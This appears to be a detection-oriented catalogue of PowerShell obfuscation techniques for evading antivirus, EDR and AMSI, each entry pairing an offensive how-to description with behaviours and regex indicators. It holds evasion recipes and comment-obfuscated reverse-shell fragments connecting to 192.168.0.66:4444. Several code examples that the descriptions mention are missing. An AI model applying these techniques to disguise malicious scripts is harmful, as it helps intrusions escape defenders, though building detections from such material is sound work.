description: When obfuscating scripts, it should be a priority to replace variable/class/function names with random ones. That way, in combination with other techniques, you will be able to bypass detection easily. But you should keep in mind the entropy of the payloads you develop. Take in consideration the following standard reverse shell script that is generally detected by most if not all AVs: Now consider the following obfuscated version: In this version, all variable names have been substituted with 32 chars long random names. I also replaced `(pwd).Path` with `$(gl)`. The payload has a `Shannon...
native_purpose: PowerShell obfuscation via rename objects to bypass signature-based detection and evade AV/EDR products
known_behaviors: Variable names replaced with random hex strings or repeated characters
Function and class names substituted with non-descriptive identifiers
Original variable names no longer present in the script
Script functionality preserved despite complete name randomization
indicators: Variable names replaced with long random hex strings (e.g. 32-char UUIDs)
Variable names consisting of repeated single characters (e.g. $fff, $fffff)
Regex: \$[a-f0-9]{16,} indicating UUID-based variable names
Unusually long or nonsensical variable names throughout the script
Script entropy analysis showing low entropy despite obfuscation

description: It's super fun and easy to replace `$True` and `$False` values with other boolean equivalents, which are literaly unlimited. Especially if you have identified the detection trigger in a given payload and that includes a `$True` or `$False` value, you will probably be able to bypass detection by simply replacing it with a boolean substitute. All of the examples below evaluate to `True`. You can reverse them to `False` by simply adding an exclamation mark before the expression (e.g., `![bool]0x01`): - Boolean typecast of literally anything that is not `0` or `Null` or an `empty string`, will...
native_purpose: PowerShell obfuscation via obfuscate boolean values to bypass signature-based detection and evade AV/EDR products
known_behaviors: [bool] typecast applied to integers, hex values, or objects to produce True/False
Comparison expressions substituted for literal $True/$False values
Object attribute access used to retrieve boolean values indirectly
Chained or negated boolean casts creating obfuscated boolean expressions
command_examples: [bool][convert]::ToInt32("111011", 2) # Converts a string to int from base 2 (binary)
[bool](-12354893)   # Boolean typecast of a negative number
indicators: [bool] type cast applied to non-boolean values (integers, strings, objects)
Regex: \[bool\]\d+ or \[bool\]0x[0-9a-fA-F]+ for boolean typecasts
Negated boolean expressions like ![bool]$null or ![bool]$False
Object attribute access to retrieve boolean values (e.g. .IsAnsiClass, .IsVisible)
Chained boolean casts: [bool][bool][bool]...
Comparison expressions used in place of literal $True/$False

description: You can obfuscate cmdlets by adding single and/or double quotes in between their characters, as long as it's not at the beginning. It's super effective! For example, the expresion `iex "pwd"` can be substituted with:
native_purpose: PowerShell obfuscation via cmdlet quote interruption to bypass signature-based detection and evade AV/EDR products
known_behaviors: Empty quotes ('') or ("") inserted within cmdlet name characters
Cmdlet still executes normally despite quote insertions
Can be combined with parameter value quote interruption
Signature-based detection bypassed by breaking cmdlet name strings
indicators: Empty single quotes ('') or double quotes ("") inserted within cmdlet names
Regex: [a-zA-Z]''[a-zA-Z] or [a-zA-Z]""[a-zA-Z] inside command tokens
Cmdlet names containing quote pairs that do not form valid string literals
Pattern: i''ex, i''e''x, ie''x'' and similar quote-interrupted invocations
Backtick-quote combinations (`"`") within parameter values

description: This is a bit dirty but might come in handy. In a Windows CMD terminal, it is possible to append the caret (^) symbol in-between a command's characters and it will still be interpreted normally. In a powershell script, one way to utilize this would be:
native_purpose: PowerShell obfuscation via cmdlet caret interruption to bypass signature-based detection and evade AV/EDR products
known_behaviors: Caret (^) inserted between command characters in cmd.exe context
Commands wrapped in cmd /c to enable caret interpretation
PowerShell spawns cmd.exe subprocess for caret-obfuscated execution
indicators: Caret (^) character inserted within command names in cmd /c context
Regex: cmd\s+/c.*\^.*[a-zA-Z] indicating caret-interrupted commands
Pattern: who^am^i, pow^ers^hell and similar caret-split tokens
cmd.exe /c wrapper used to execute caret-obfuscated commands
Process tree: powershell.exe -> cmd.exe with caret-containing arguments

description: A really cool trick my friend and mighty haxor Karol Musolff (@kmusolff) showed me. You can use `Get-Command` (or `gcm`) to retrieve the name (string) of any command, including all of the non-PowerShell files in the Path environment variable (`$env:Path`) by using wildcards. You can then run them as jobs with the `&` operator. For example, the following line: Could be obfuscated to: Or even better, this one, that has a lower `Shannon entropy` value:
native_purpose: PowerShell obfuscation via get-command technique to bypass signature-based detection and evade AV/EDR products
known_behaviors: Get-Command or gcm resolves cmdlet names via wildcard patterns
Resolved command invoked with & (call operator)
Wildcard padding with extra * characters lowers entropy
Any command in $env:Path can be resolved this way
indicators: Get-Command or gcm with wildcard patterns to resolve cmdlet names
Regex: (Get-Command|gcm)\s+[a-zA-Z]*\*[a-zA-Z*]* for wildcard command resolution
Call operator & used with (Get-Command ...) or (gcm ...) result
Excessive wildcard characters (*) used to pad patterns and lower entropy
Pattern: &(gcm i*x) or &(Get-Command i????e-rest*) for indirect invocation

description: There are certain loops that can be substituted with other loop types or functions. For example, a `While ($True){ # some code }` loop can be substituted with the following: **An infinite For loop** **A Do-While loop** **A Do-Until loop** **A recursive function**
native_purpose: PowerShell obfuscation via substitute loops to bypass signature-based detection and evade AV/EDR products
known_behaviors: While($True) replaced with For(;;), Do-While, Do-Until, or recursive functions
Loop functionality preserved with different syntax construct
Detection signatures targeting specific loop patterns are bypassed
indicators: Infinite For(;;) loop used in place of While($True)
Do-While or Do-Until loops replacing standard While loops
Recursive function calls used as loop substitutes
Unusual loop constructs that achieve the same iteration as common patterns
Pattern: Do { ... } Until (1 -eq 2) as infinite loop substitute

description: You can try adding parameters to a cmdlet. For example, the following line: Could be expanded to: You may of course try the opposite.
native_purpose: PowerShell obfuscation via add/remove parameters to bypass signature-based detection and evade AV/EDR products
known_behaviors: Extra cmdlet parameters (-Debug, -Verbose) appended as filler
Parameters are valid but produce no meaningful effect on output
Command signature broken by the additional parameter noise
indicators: Extraneous parameters appended to cmdlets (-Debug, -Verbose, -ErrorVariable)
Parameters like -InformationAction, -WarningAction added to pad commands
Legitimate but unnecessary cmdlet parameters used as filler

description: You can "pollute" a script with random variables and functions. Assume the following script as malicious: You might be able to break its signature by doing something like:
native_purpose: PowerShell obfuscation via append random objects to bypass signature-based detection and evade AV/EDR products
known_behaviors: Junk commands (sleep, Get-Process | Out-Null) inserted between real lines
Random no-op operations pad the script without changing behavior
Script signature disrupted by interleaved filler operations
indicators: Random variables and functions injected into the script as noise
sleep commands and no-op pipelines (| Out-Null) between real operations
Pattern: sleep 0.01; Get-Process | Out-Null as inter-command junk
Junk operations that execute but produce no meaningful side effects

description: You can always look for commands or even whole code blocks in a script that you can substitute with components that have the same/similar functionality. In the following classic reverse shell script, the `pwd` command is used to retrieve the current working directory and reconstruct the shell's prompt value: The `(pwd).Path` part can be replaced by the following weird, unorthodox little script and although it even includes `pwd` it does serve our purpose of breaking the signature while maintaining the functionality of the script: There are of course simpler substitutes for `pwd` like `gl`,...
native_purpose: PowerShell obfuscation via substitute commands to bypass signature-based detection and evade AV/EDR products
known_behaviors: Common cmdlets replaced with lesser-known functional equivalents
pwd replaced with gl, get-location, or cmd.exe /c chdir
Complex string manipulation achieving same result as simple commands
indicators: Alternative cmdlets used in place of common commands (gl instead of pwd)
Split-Path and string manipulation replacing simple path commands
cmd.exe /c chdir used instead of PowerShell's Get-Location
Unusual code constructs achieving the same result as standard cmdlets
Regex: \$\(gl\)|get-location|cmd\.exe\s+/c\s+chdir as pwd substitutes

description: At the expense of adding a few new lines, you can turn a string into a here-string. This: Is the same as:
native_purpose: PowerShell obfuscation via convert string to here-string to bypass signature-based detection and evade AV/EDR products
known_behaviors: Strings constructed via concatenation, substring extraction, regex replace, or encoding
Original string values not visible in plaintext form
Sub-technique of mess with strings obfuscation
indicators: Here-string syntax @"..."@ used to wrap variable expansion
Pattern: iex @"\n$variable\n"@ replacing direct string evaluation
Multi-line here-string used where single-line string would suffice

description: PowerShell obfuscation technique: Reverse Strings. Manual obfuscation method for evading signature-based detection in PowerShell scripts and payloads.
native_purpose: PowerShell obfuscation via reverse strings to bypass signature-based detection and evade AV/EDR products
known_behaviors: String reversed via .ToCharArray() and [array]::reverse()
Reversed characters rejoined with -join operator
Original string not visible in plaintext form
indicators: .ToCharArray() followed by [array]::reverse() to reconstruct strings
Regex: \.ToCharArray\(\).*\[array\]::reverse indicating string reversal
Reversed string content joined with -join operator

description: PowerShell obfuscation technique: Concatenation. Manual obfuscation method for evading signature-based detection in PowerShell scripts and payloads.
native_purpose: PowerShell obfuscation via concatenation to bypass signature-based detection and evade AV/EDR products
known_behaviors: String split into fragments and joined with + operator
Each fragment is individually harmless but assembles to payload
Classic string concatenation obfuscation technique
indicators: String fragments joined with + operator to form command names or payloads
Pattern: 'fragment1' + 'fragment2' assembling recognizable strings
Multiple short string literals concatenated in sequence

description: Add the desired value between an irrelevant string and use `substring()` to extract it based on start - end indexes:
native_purpose: PowerShell obfuscation via get string from substring: to bypass signature-based detection and evade AV/EDR products
known_behaviors: Desired value hidden inside a larger junk string
.Substring(start, length) extracts the real value at runtime
Junk padding characters make the string appear benign
indicators: .Substring() method extracting hidden values from padding strings
Regex: '[^']+'\.Substring\(\d+,\d+\) for value extraction
Junk characters surrounding the real value, extracted by index

description: PowerShell obfuscation technique: Replace string by regex match:. Manual obfuscation method for evading signature-based detection in PowerShell scripts and payloads.
native_purpose: PowerShell obfuscation via replace string by regex match: to bypass signature-based detection and evade AV/EDR products
known_behaviors: Junk string replaced with real value via -replace and regex
Pattern matching swaps arbitrary content for the desired payload
Original payload string not present in the script source
indicators: -replace operator with regex pattern swapping junk for real values
Regex: -replace\s+'[^']+','[^']+' indicating pattern substitution
Arbitrary string replaced via regex to produce the desired payload

description: PowerShell obfuscation technique: Base64 decode the desired string:. Manual obfuscation method for evading signature-based detection in PowerShell scripts and payloads.
native_purpose: PowerShell obfuscation via base64 decode the desired string: to bypass signature-based detection and evade AV/EDR products
known_behaviors: String Base64-encoded and decoded at runtime within the script
[System.Convert]::FromBase64String() recovers the original value
Encoded string appears as opaque Base64 data in the script
indicators: [System.Convert]::FromBase64String() used for inline string decoding
[System.Text.Encoding]::Default.GetString() recovering plaintext from Base64
Regex: FromBase64String\("[A-Za-z0-9+/=]+"\)
Base64-encoded values embedded directly in script for runtime decoding

description: PowerShell obfuscation technique: Get the desired string's chars from bytes:. Manual obfuscation method for evading signature-based detection in PowerShell scripts and payloads.
native_purpose: PowerShell obfuscation via get the desired string's chars from bytes: to bypass signature-based detection and evade AV/EDR products
known_behaviors: Each character constructed from hex byte values via [char]([byte]0x..)
String assembled character by character from byte literals
Original string completely obscured as a sequence of hex codes
indicators: [char]([byte]0x..) sequences assembling strings character by character
Hex byte values cast to [char] and concatenated
Regex: \[char\]\(\[byte\]0x[0-9a-fA-F]{2}\) repeated in sequence
String interpolation with character-from-byte expressions

description: Obfuscating a script by appending comments here and there might actually do the trick on its own. for example, a reverse shell command could be obfuscated like this: #### Original (Common r-shell command that is easily detected by AVs) #### Modified (appended `<# Suspendisse imperdiet lacus eu tellus pellentesque suscipit #>` in various places) This will not only work, but also lower the payload's `Shannon entropy` value (given that you don't use complex random comments).
native_purpose: PowerShell obfuscation via appending comments to bypass signature-based detection and evade AV/EDR products
known_behaviors: Block comments <# ... #> inserted throughout the script
Natural language text in comments lowers Shannon entropy
Comment placement between code statements breaks signatures
command_examples: <# Suspendisse imperdiet lacus eu tellus pellentesque suscipit #> $client = New-Object System.Net.Sockets.TCPClient("192.168.0.66", 4444) <# Lorem ipsum dolor sit amet #>
$stream = $client.GetStream() <# Praesent commodo cursus magna #>; [byte[]]$bytes = 0..65535|%{0} <# vel scelerisque nisl consectetur #>
iex <# Nullam quis risus eget urna #> $data <# mollis ornare vel eu leo #>
indicators: Block comments <# ... #> inserted between code statements
Natural language filler text in comments to lower Shannon entropy
Pattern: <# Suspendisse imperdiet ... #> as Latin filler

description: There are malware-ish strings that will trigger AMSI immediately and it should be a priority to replace them, when obfuscating scripts. Check this out: Just by typing the string 'invoke-mimikatz' in the terminal AMSI is having a stroke (the script is not even present / loaded). These strings may be found in comments as well, so it's a good idea to remove them, especially from FOS resources you grab from the internet (e.g. `Invoke-Mimikatz.ps1` from GitHub). \*It's generally a good idea to remove comments. This was just an example.
native_purpose: PowerShell obfuscation via removing comments to bypass signature-based detection and evade AV/EDR products
known_behaviors: Comments containing AMSI-triggering strings removed from scripts
Tool names like 'Invoke-Mimikatz' in comments cause false positives
Cleaning comments from public offensive tools reduces detection surface
command_examples: # Remove comments containing tool names: 'Invoke-Mimikatz' triggers AMSI
# Strip all comment blocks from downloaded offensive PowerShell scripts
indicators: Removal of comments containing tool names that trigger AMSI
Strings like 'invoke-mimikatz' in comments flagging detection
Stripping comments from publicly available offensive scripts

description: Probably the oldest trick in the book. Randomazing the character case of cmdlets and parameters might help:
native_purpose: PowerShell obfuscation via randomize char cases to bypass signature-based detection and evade AV/EDR products
known_behaviors: Character casing randomized in cmdlet and parameter names
PowerShell's case-insensitive execution allows arbitrary casing
Exact-match signature detection defeated by case variation
indicators: Mixed character casing in cmdlet and parameter names
Regex: [a-z][A-Z][a-z][A-Z] alternating case pattern in tokens
Pattern: inVOkE-eXpReSSioN, WHoAmI and similar randomized casing
Case randomization applied to both cmdlets and parameters

description: Sometimes simply moving variables and classes to different locations might work, especially if you have found the detection trigger and it includes some variable definition that could be taking place somewhere else, like the beginning of the script.
native_purpose: PowerShell obfuscation via rearrange script components to bypass signature-based detection and evade AV/EDR products
known_behaviors: Variable definitions and code blocks relocated within the script
Execution flow preserved despite structural reordering
Detection triggers broken by separating co-located components
command_examples: # Move variable definitions to the top of the script to break detection signatures
$client = New-Object System.Net.Sockets.TCPClient; $stream = $client.GetStream(); # rearranged from original position
indicators: Variable definitions moved to different locations within the script
Script structure reordered while maintaining execution flow
Detection trigger components separated by relocating definitions
Functions and variable assignments placed at script beginning to break signatures

description: Sometimes, it is possible to achieve AV evasion by simply executing a malicious script line by line. This can of course be challenging to pull off given the circumstances. In case you try it, be aware of script blocks that have to be executed as a whole (e.g., loops, try-catch blocks, conditional statements, function definitions, etc). To test this, you can grab a common PowerShell reverse shell script (no obfuscation applied) and execute it line by line. Does it get flagged? ;)
native_purpose: PowerShell obfuscation via execute script line by line to bypass signature-based detection and evade AV/EDR products
known_behaviors: Malicious script broken into individual lines for separate execution
Block-level AMSI scanning bypassed by line-at-a-time execution
Script blocks (loops, functions) that must execute together identified and preserved
indicators: Malicious script executed one line at a time to evade block-level scanning
Script blocks broken apart for individual line execution
Avoiding execution of complete script blocks that would trigger detection
Careful handling of loops, try-catch, and function definitions that must execute as blocks
